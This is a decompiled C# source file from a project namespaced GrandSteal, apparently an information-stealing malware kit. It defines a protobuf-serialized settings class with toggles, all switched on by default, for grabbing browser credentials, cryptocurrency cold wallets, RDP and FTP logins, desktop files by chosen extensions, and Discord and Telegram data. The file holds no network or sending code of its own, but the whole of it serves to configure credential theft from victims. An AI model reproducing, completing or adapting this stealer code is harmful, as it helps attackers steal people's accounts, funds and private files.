using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.CompilerServices;
using ProtoBuf;

namespace GrandSteal.SharedModels.Models
{
	// Token: 0x02000008 RID: 8
	[ProtoContract(Name = "ClientSettings")]
	public class ClientSettings : INotifyPropertyChanged
	{
		// Token: 0x06000061 RID: 97 RVA: 0x00002671 File Offset: 0x00000871
		public ClientSettings() : this(false)
		{
		}

		// Token: 0x06000062 RID: 98 RVA: 0x0000267A File Offset: 0x0000087A
		public ClientSettings(bool load = false)
		{
			this._dataPath = Path.Combine(Directory.GetCurrentDirectory(), "ClientSettings.db");
			this._fileLock = new object();
			if (load)
			{
				this.Load();
			}
		}

		// Token: 0x06000063 RID: 99 RVA: 0x000036C0 File Offset: 0x000018C0
		public void SetDefaults()
		{
			this.DesktopExtensions = new BindingList<string>
			{
				AllowNew = true,
				AllowRemove = true,
				RaiseListChangedEvents = true,
				AllowEdit = true
			};
			this.GrabBrowserCredentials = true;
			this.GrabColdWallets = true;
			this.GrabRdp = true;
			this.GrabFtp = true;
			this.GrabDesktopFiles = true;
			this.GrabDiscord = true;
			this.GrabTelegram = true;
		}

		// Token: 0x06000064 RID: 100 RVA: 0x000026AB File Offset: 0x000008AB
		public void SusspendNotifies(bool raise)
		{
			this.DesktopExtensions.RaiseListChangedEvents = raise;
			if (raise)
			{
				this.DesktopExtensions.ResetBindings();
			}
		}

		// Token: 0x17000022 RID: 34
		// (get) Token: 0x06000065 RID: 101 RVA: 0x000026C7 File Offset: 0x000008C7
		// (set) Token: 0x06000066 RID: 102 RVA: 0x000026CF File Offset: 0x000008CF
		[ProtoMember(1, Name = "GrabBrowserCredentials")]
		public bool GrabBrowserCredentials
		{
			get
			{
				return this._grabBrowserCredentials;
			}
			set
			{
				this._grabBrowserCredentials = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D != null)
				{
					expr_0D(this, new PropertyChangedEventArgs("GrabBrowserCredentials"));
				}
				this.Save();
			}
		}

		// Token: 0x17000023 RID: 35
		// (get) Token: 0x06000067 RID: 103 RVA: 0x000026FA File Offset: 0x000008FA
		// (set) Token: 0x06000068 RID: 104 RVA: 0x00002702 File Offset: 0x00000902
		[ProtoMember(2, Name = "GrabColdWallets")]
		public bool GrabColdWallets
		{
			get
			{
				return this._grabColdWallets;
			}
			set
			{
				this._grabColdWallets = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D != null)
				{
					expr_0D(this, new PropertyChangedEventArgs("GrabColdWallets"));
				}
				this.Save();
			}
		}

		// Token: 0x17000024 RID: 36
		// (get) Token: 0x06000069 RID: 105 RVA: 0x0000272D File Offset: 0x0000092D
		// (set) Token: 0x0600006A RID: 106 RVA: 0x00002735 File Offset: 0x00000935
		[ProtoMember(3, Name = "GrabRdp")]
		public bool GrabRdp
		{
			get
			{
				return this._grabRdp;
			}
			set
			{
				this._grabRdp = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D != null)
				{
					expr_0D(this, new PropertyChangedEventArgs("GrabRdp"));
				}
				this.Save();
			}
		}

		// Token: 0x17000025 RID: 37
		// (get) Token: 0x0600006B RID: 107 RVA: 0x00002760 File Offset: 0x00000960
		// (set) Token: 0x0600006C RID: 108 RVA: 0x00002768 File Offset: 0x00000968
		[ProtoMember(4, Name = "GrabFtp")]
		public bool GrabFtp
		{
			get
			{
				return this._grabFtp;
			}
			set
			{
				this._grabFtp = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D != null)
				{
					expr_0D(this, new PropertyChangedEventArgs("GrabFtp"));
				}
				this.Save();
			}
		}

		// Token: 0x17000026 RID: 38
		// (get) Token: 0x0600006D RID: 109 RVA: 0x00002793 File Offset: 0x00000993
		// (set) Token: 0x0600006E RID: 110 RVA: 0x0000279B File Offset: 0x0000099B
		[ProtoMember(5, Name = "GrabDesktopFiles")]
		public bool GrabDesktopFiles
		{
			get
			{
				return this._grabDesktopFiles;
			}
			set
			{
				this._grabDesktopFiles = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D != null)
				{
					expr_0D(this, new PropertyChangedEventArgs("GrabDesktopFiles"));
				}
				this.Save();
			}
		}

		// Token: 0x17000027 RID: 39
		// (get) Token: 0x0600006F RID: 111 RVA: 0x000027C6 File Offset: 0x000009C6
		// (set) Token: 0x06000070 RID: 112 RVA: 0x000027CE File Offset: 0x000009CE
		[ProtoMember(6, Name = "DesktopExtensions")]
		public BindingList<string> DesktopExtensions
		{
			get
			{
				return this._desktopExtensions;
			}
			set
			{
				this._desktopExtensions = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D != null)
				{
					expr_0D(this, new PropertyChangedEventArgs("DesktopExtensions"));
				}
				this.Save();
			}
		}

		// Token: 0x17000028 RID: 40
		// (get) Token: 0x06000071 RID: 113 RVA: 0x000027F9 File Offset: 0x000009F9
		// (set) Token: 0x06000072 RID: 114 RVA: 0x00002801 File Offset: 0x00000A01
		[ProtoMember(7, Name = "GrabTelegram")]
		public bool GrabTelegram
		{
			get
			{
				return this._grabTelegram;
			}
			set
			{
				this._grabTelegram = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D != null)
				{
					expr_0D(this, new PropertyChangedEventArgs("GrabTelegram"));
				}
				this.Save();
			}
		}

		// Token: 0x17000029 RID: 41
		// (get) Token: 0x06000073 RID: 115 RVA: 0x0000282C File Offset: 0x00000A2C
		// (set) Token: 0x06000074 RID: 116 RVA: 0x00002834 File Offset: 0x00000A34
		[ProtoMember(8, Name = "GrabDiscord")]
		public bool GrabDiscord
		{
			get
			{
				return this._grabDiscord;
			}
			set
			{
				this._grabDiscord = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D != null)
				{
					expr_0D(this, new PropertyChangedEventArgs("GrabDiscord"));
				}
				this.Save();
			}
		}

		// Token: 0x06000075 RID: 117 RVA: 0x00003728 File Offset: 0x00001928
		public void Save()
		{
			object fileLock = this._fileLock;
			lock (fileLock)
			{
				if (!this._isLoading)
				{
					using (FileStream fileStream = new FileStream(this._dataPath, FileMode.Create))
					{
						Serializer.SerializeWithLengthPrefix<ClientSettings>(fileStream, this, PrefixStyle.Base128);
					}
				}
			}
		}

		// Token: 0x06000076 RID: 118 RVA: 0x00003790 File Offset: 0x00001990
		public void Load()
		{
			object fileLock = this._fileLock;
			lock (fileLock)
			{
				this._isLoading = true;
				if (File.Exists(this._dataPath))
				{
					byte[] array = File.ReadAllBytes(this._dataPath);
					if (array != null && array.Length != 0)
					{
						using (MemoryStream memoryStream = new MemoryStream(array))
						{
							ClientSettings clientSettings = Serializer.DeserializeWithLengthPrefix<ClientSettings>(memoryStream, PrefixStyle.Base128);
							if (clientSettings.DesktopExtensions == null)
							{
								clientSettings.DesktopExtensions = new BindingList<string>
								{
									AllowNew = true,
									AllowRemove = true,
									RaiseListChangedEvents = true,
									AllowEdit = true
								};
							}
							this.DesktopExtensions = clientSettings.DesktopExtensions;
							this.GrabBrowserCredentials = clientSettings.GrabBrowserCredentials;
							this.GrabColdWallets = clientSettings.GrabColdWallets;
							this.GrabDesktopFiles = clientSettings.GrabDesktopFiles;
							this.GrabFtp = clientSettings.GrabFtp;
							this.GrabRdp = clientSettings.GrabRdp;
							this.GrabDiscord = clientSettings.GrabDiscord;
							this.GrabTelegram = clientSettings.GrabTelegram;
						}
					}
				}
				this._isLoading = false;
			}
			if (!File.Exists(this._dataPath))
			{
				this.SetDefaults();
				this.Save();
			}
		}

		// Token: 0x14000007 RID: 7
		// (add) Token: 0x06000077 RID: 119 RVA: 0x000038CC File Offset: 0x00001ACC
		// (remove) Token: 0x06000078 RID: 120 RVA: 0x00003904 File Offset: 0x00001B04
		[method: CompilerGenerated]
		[CompilerGenerated]
		public event PropertyChangedEventHandler PropertyChanged;

		// Token: 0x04000028 RID: 40
		private readonly string _dataPath;

		// Token: 0x04000029 RID: 41
		private readonly object _fileLock;

		// Token: 0x0400002A RID: 42
		private bool _isLoading;

		// Token: 0x0400002B RID: 43
		private bool _grabBrowserCredentials;

		// Token: 0x0400002C RID: 44
		private bool _grabColdWallets;

		// Token: 0x0400002D RID: 45
		private bool _grabRdp;

		// Token: 0x0400002E RID: 46
		private bool _grabFtp;

		// Token: 0x0400002F RID: 47
		private bool _grabDesktopFiles;

		// Token: 0x04000030 RID: 48
		private bool _grabTelegram;

		// Token: 0x04000031 RID: 49
		private bool _grabDiscord;

		// Token: 0x04000032 RID: 50
		private BindingList<string> _desktopExtensions;
	}
}
